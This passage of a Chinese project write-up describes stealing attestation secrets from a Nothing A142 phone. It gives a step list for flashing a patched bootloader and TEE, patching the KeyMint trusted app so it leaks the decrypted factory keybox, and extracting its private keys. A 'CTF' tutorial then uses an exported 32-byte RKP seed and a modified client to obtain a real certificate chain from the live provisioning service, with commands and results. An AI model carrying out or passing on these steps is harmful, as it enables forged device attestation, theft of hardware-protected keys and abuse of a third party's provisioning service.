4. 刷 tee_a = tee-patched-A-only.img
5. 刷 init_boot_a = magisk_patched.img
6. 确认系统正常启动，TEE / keystore2 / KeyMint HAL 正常
7. 用 root dump KeyMint TA 和 persist blobs
8. 用 analysis/patch_0706_dump.py 生成 patched KeyMint TA
9. 编译 keymint_tee_client/kmtee_probe.c
10. 推送 kmtee_probe 和 patched TA 到 /data/local/tmp
11. 运行 kmtee_probe
12. 拉回 keymint_tee_client/out_patched/attest_keybox_buf_after.bin
13. 用 analysis/extract_keybox_plain.py 拆 keybox
14. 转 PEM
15. openssl 验证私钥、公钥、证书链和签名
16. 得到 extracted_keybox/keybox.xml
```

---

## 24. 为什么这个方法能成功？

因为同时满足了三件事。

### 第一件事：启动链被放开

```text
fenrir patched LK
```

让 modified TEE 可以启动。

### 第二件事：TEE 里的 TA 签名校验被放开

```text
tee-patched-A-only.img
```

让 modified KeyMint TA 可以被加载。

### 第三件事：KeyMint TA 本来就有解密 keybox 的能力

它正常就需要读取：

```text
/mnt/vendor/persist/attest_keybox.so
```

并在 Secure World 里解密。

项目只是 patch 它：

```text
解密之后别急着 free，先 copy 回 mapped buffer
```

所以成功的关键不是“破解加密”，而是：

```text
利用真实 TA 的真实解密流程，把明文生命周期抓住
```

---

## 25. 用一个生活化比喻理解

可以把这个过程想成银行保险柜。

```text
attest_keybox.so = 上锁的保险柜盒子
KeyMint TA = 银行工作人员，知道怎么打开盒子
Secure World = 银行内部房间
Normal World = 银行大厅
```

正常情况：

```text
你把盒子交给工作人员
工作人员进内部房间打开
看完里面的东西
再把盒子关上
你在大厅看不到内容
```

本项目做的是：

```text
先让银行允许你安排一个“改过流程的工作人员”
这个工作人员还是会用正确钥匙打开盒子
但打开后会把内容复印一份递回大厅
```

direct client 就是你自己写的“窗口办事程序”：

```text
不用走原来的银行 App / 系统流程
自己直接把盒子递给这个改过流程的工作人员
然后接收复印件
```

---

## 26. 最后再压缩成一句话

整个项目的本质是：

> 通过 patched LK 和 patched TEE 获得加载 modified KeyMint TA 的能力；再 patch KeyMint TA，让它在解密 factory `attest_keybox.so` 后，把 Secure World 中短暂存在的 keybox 明文复制回 Normal World；最后用脚本拆出 EC/RSA attestation 私钥和证书链并验证。



---

## 原始记录段 3 / Source section 3: 06_CTF_RKP_32字节材料授权实验教程_20260826.md

# CTF RKP 32 字节材料授权实验教程

文档类型：教程（只针对 RKP，不包含传统 KeyMint factory Keybox 提取）

日期：2026-08-26

## 1. 用途和授权边界

本教程用于在明确授权的 CTF / 渗透测试环境中，验证从设备导出的 32 字节
`rkp_bcc_km` 材料是否可被 `google-rkp-sw` 用于构造 CSRv3，并获得与新生成的
P-256 私钥匹配的 RKP 证书链。

执行前必须确认：

- 设备、账号和签发端均在授权范围内；
- 每次请求都可能改变服务端近 30 天颁发统计；
- 先用 1 把密钥做最小化验证；
- 一旦得到 HTTP 200，不自动继续申请。

## 2. 标准工作目录

```text
工作区
<PROJECT_ROOT>

RKP 文档
正规目录_按目标分类/目标二_提取RKP/01_文档

RKP 实验输出
正规目录_按目标分类/目标二_提取RKP/04_结果/outputs

开源客户端
third_party/google-rkp-sw
```

Keybox 传统私钥、RSA/EC factory 证书和 Keybox 流水账不放进本目标的文档或
结果目录。

## 3. 实验输入

### 3.1 设备材料

已验证的设备：

```text
brand       Nothing
model       A142
device      Pacman
product     PacmanEEA
fingerprint Nothing/PacmanEEA/Pacman:14/UP1A.231005.007/2401142323:user/release-keys
```

导出证据：

```text
KDF label             rkp_bcc_km
KDF status            0
output length         32 bytes
pointer marker        0x1234
seed SHA-256          e0e2617b3156d12a0b7108b71340484c3e4ae965ae686d7360c8032f2d82a7c3
```

教程只记录种子指纹，不记录 32 字节原文。

### 3.2 文件和权限

```text
third_party/google-rkp-sw/ctf_artifacts/ctf_seed.bin
third_party/google-rkp-sw/device_prop.conf
```

权限要求：

```bash
chmod 600 \
  third_party/google-rkp-sw/ctf_artifacts/ctf_seed.bin \
  third_party/google-rkp-sw/device_prop.conf
```

种子文件必须是 32 字节 raw 或 64 个十六进制字符。不要使用 `--seed HEX`，避免
秘密出现在 shell history 或进程参数中。

## 4. DeviceInfoV3 配置

CSR payload version 3 必须只携带 DeviceInfoV3 允许的字段：

```text
brand
manufacturer
product
model
device
vb_state
bootloader_state
vbmeta_digest
os_version
system_patch_level
boot_patch_level
vendor_patch_level
security_level
fused
```

不能进入 CSRv3 DeviceInfo 的已知字段：

```text
version
architecture
board
oemcrypto_build_info
dice_issuer
dice_subject
```

`dice_issuer` 和 `dice_subject` 可用于脚本内部构造 DICE entry，但它们不是
DeviceInfoV3 成员。

## 5. 网络前强制留档

`rkp_sw.py` 的 `keybox` 和 `provision` 路径已修改为：

1. 网络前创建新的、不覆盖的 run 目录；
2. 先保存待签 P-256 PKCS#8 私钥；
3. 先保存 CSR 并读回比对；
4. 没有 capture directory 时拒绝调用 `signCertificates`；
5. 响应先保存 raw bytes 和 HTTP metadata，然后才做 CBOR 解析；
6. 成功后保存每张 DER/PEM、原始链顺序、叶到根顺序和公私钥匹配结果。

输出目录必须在执行前不存在。不要复用已经包含请求或响应的 run 目录。

## 6. 单密钥执行

在工作区根目录执行：

```bash
third_party/google-rkp-sw/.venv/bin/python \
  third_party/google-rkp-sw/rkp_sw.py keybox \
  --seed-file third_party/google-rkp-sw/ctf_artifacts/ctf_seed.bin \
  --config third_party/google-rkp-sw/device_prop.conf \
  --output-dir '正规目录_按目标分类/目标二_提取RKP/04_结果/outputs/<new_run_name>'
```

已成功运行的证据目录是：

```text
04_结果/outputs/google_rkp_sw_live_1key_20260826_03
```

不要对该目录重复执行，也不要为了验证脚本而再申请一张证书。

## 7. 预期产物

成功 run 应至少包含：

```text
run_summary.json
device_info.json
device_info_csr_v3.json
fetch_eek_request.cbor
fetch_eek_response.cbor
key_00/private_key_pkcs8.pem
key_00/public_key_spki.der
certificate_request.cbor
response.cbor
response_http.json
chain_00/certificate_chain.der
chain_00/cert_XX.der/.pem
chain_00/ordered_certificate_chain.der/.pem
chain_00/ordered_cert_XX.der/.pem
chain_00/chain_summary.json
keybox.xml
verification_report.json
SHA256SUMS.txt
```

权限：

```text
run/chain/key directories  0700
all files                  0600
```

## 8. 必须验证的内容

成功不能只看 HTTP 200。验收项：

- HTTP status 为 200；
- 返回链数等于请求密钥数；
- 真正 RKP 叶证书公钥与保存私钥匹配；
- issuer/subject 能组成完整链；
- 每一段证书签名和根自签有效；
- `keybox.xml` 第一张证书是匹配私钥的 RKP 叶证书；
- 叶证书有效期和 OID `1.3.6.1.4.1.11129.2.1.30` 已记录；
- 原始响应中的链与已保存 raw chain 逐字节相同。

本次已验证结果：

```text
HTTP status                         200
requested/returned chains           1 / 1
certificates in chain               4
leaf private/public match           true
issuer signature links              true
root self-signature                 true
leaf notAfter                       2026-09-06T19:44:56Z
last-30-days approximate count       128
```

## 9. 失败处理

### 9.1 网络前失败

如果在生成私钥、保存 DeviceInfo 或 CSR 时失败，应标记 `network_attempted=false`，
保留 run 目录作为失败证据，用新编号目录重跑。

### 9.2 HTTP 400

先读已保存的 `response.cbor` / JSON body，不盲目重试。本次的 400 明确指向
CSRv3 DeviceInfo 误含 `version`；修正字段集后才进行下一次提交。

### 9.3 HTTP 444 / 身份不受信

应停止重试并检查：

- 32 字节是否属于已登记身份；
- 种子派生曲线和公钥是否与历史证据一致；
- DICE/UDS 结构是否与平台登记模式一致；
- DeviceInfo 是否属于同一设备身份。

随机更换 32 字节不会提高成功概率，只会派生新的、未登记的公钥身份。

## 10. 数量口径

需同时记录两个数：

1. 本次 HTTP 响应实际返回的 RKP 链数；
2. 叶证书 provisioning information 中 key `1` 的近 30 天近似颁发数。

本次：

```text
actual chains returned                  1
certificates_issued_last_30_days_approx 128
```

128 不是这次生成了 128 张证书。

## 11. 文档与证据入口

- 报告：`01_文档/04_CTF_RKP_经验总结_20260826.md`
- 流水账：`01_文档/05_CTF_RKP_实验流水账_20260826.md`
- 旧协议复现：`01_文档/02_二次复现文档.md`
- 成功运行：`04_结果/outputs/google_rkp_sw_live_1key_20260826_03/`
- 签发台账：`04_结果/outputs/rkp_issuance_ledger_20260826.json`
